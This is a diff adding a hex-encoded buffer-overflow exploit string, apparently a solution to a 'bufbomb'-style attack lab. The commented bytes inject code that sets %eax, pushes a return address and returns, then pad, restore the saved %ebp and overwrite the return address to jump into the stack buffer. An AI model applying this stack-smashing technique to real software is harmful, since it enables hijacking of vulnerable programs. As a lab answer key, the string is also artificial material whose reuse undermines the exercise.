@@ -1,0 +1,10 @@
+b8 4e d7 5b 5f       	/* 0 mov    $0x5f5bd74e,%eax */ 
+68 c1 8d 04 08       	/* 5 push   $0x8048dc1 */ 
+c3                   	/* a ret	*/ 
+00 00 00 00 00  
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 			/* pad 16byte zeros */  
+d0 3a 68 55 			/* ebp @ 0x55683aa0 , recover tests ebp=55683ad0 */   
+80 3a 68 55 			/* return address @ebp+4, make it to ebp-0x20 = 0x55683a80 */    
